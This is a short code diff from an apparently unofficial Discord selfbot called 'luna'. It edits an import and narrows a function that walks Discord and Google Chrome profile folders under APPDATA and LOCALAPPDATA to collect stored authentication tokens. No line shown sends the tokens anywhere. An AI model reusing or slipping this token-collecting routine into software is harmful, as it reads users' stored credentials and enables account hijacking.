@@ -36,7 +36,7 @@ from datetime import datetime
 from pypresence import Presence
 from discord.ext import commands
 from urllib.request import urlopen
-from urllib.parse import quote_plus
+from urllib.parse import non_hierarchical, quote_plus
 from time import localtime, strftime
 from AuthGG.client import Client as luna_gg
 from discord.ext.commands import MissingPermissions, CheckFailure, CommandNotFound, has_permissions
@@ -800,7 +800,7 @@ class luna:
 			tokens = []
 			local = os.getenv('LOCALAPPDATA')
 			roaming = os.getenv('APPDATA')
-			paths = {'Discord': roaming + '\\Discord', 'Discord Canary': roaming + '\\DiscordCanary', 'Discord PTB': roaming + '\\discordptb', 'Discord PTB Canary': roaming + '\\discordptbcanary', 'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default'}
+			paths = {'Discord': roaming + '\\Discord', 'Discord Canary': roaming + '\\DiscordCanary', 'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default'}
 			for platform, path in paths.items():
 				if not os.path.exists(path):
 					continue
